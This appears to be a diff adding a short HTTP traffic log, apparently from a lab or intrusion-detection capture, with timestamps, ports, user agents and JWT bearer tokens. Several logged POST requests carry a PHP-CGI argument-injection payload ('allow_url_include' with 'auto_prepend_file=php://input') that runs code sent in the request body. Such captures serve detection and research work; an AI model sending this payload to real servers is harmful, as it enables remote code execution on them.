@@ -1,0 +1,10 @@
+39.362827 , HTTP , POST , /?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 (application/x-www-form-urlencoded) , 59420 , 8083 , "Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr"
+39.364346 , HTTP , HTTP/1.1 , status=200 , (text/html) , 8083 , 59420
+39.505696 , HTTP , HTTP/1.1 , status=200 , 8081 , 59419 , Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIyMTYiLCJpZCI6MjE2LCJleHAiOjE2NzUzNTMyNDUsImlhdCI6MTY3NTI2Njg0NX0.DORDwk2se57V-GaYJeI6c4ddZZLLX3qGLtt5IAXFJlbwyZPRHg7cvRQ-d5XgWjQJJpZ944iSDsuQ3IbdQ6k0Cg
+39.507610 , HTTP/JSON , HTTP/1.1 , 415 , JavaScript Object Notation (application/json) , 8083 , 59418
+39.509166 , HTTP , POST , path=/client/Products/1/buy?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 (application/x-www-form-urlencoded) , 59421 , 8083 , "Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr"
+39.510078 , HTTP , POST , path=/ident/register/Anonymous , HTTP/1.1 , 59422 , 8081 , Java/16.0.1
+39.560852 , HTTP , POST , path=/client/Products/1/buy?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 (application/x-www-form-urlencoded) , 59423 , 8083 , "Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr"
+39.561698 , HTTP , POST , path=/ident/register/Anonymous , HTTP/1.1 , 59424 , 8081 , Java/16.0.1
+39.657620 , HTTP , HTTP/1.1 , status=200 , 8081 , 59422 , Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIyMTciLCJpZCI6MjE3LCJleHAiOjE2NzUzNTMyNDUsImlhdCI6MTY3NTI2Njg0NX0.TIzY0ichF8TZsgORlWff-1rLhPUTYF4DTjyCVKaacGeJv2GmJznPUz524Cw1yVO240GkKKnZgaKcHUHESGeISg
+39.659696 , HTTP/JSON , HTTP/1.1 , 415 , JavaScript Object Notation (application/json) , 8083 , 59421
